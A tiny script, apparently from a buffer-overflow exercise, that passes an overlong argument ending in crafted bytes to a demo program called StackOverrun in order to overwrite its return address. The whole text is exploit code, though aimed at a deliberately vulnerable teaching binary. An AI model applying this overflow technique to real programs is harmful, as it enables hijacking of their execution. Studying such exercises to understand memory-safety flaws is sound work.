$arg = "111111111111111111"."\x30\xfd";
$cmd = "out/StackOverrun ".$arg;

system($cmd);


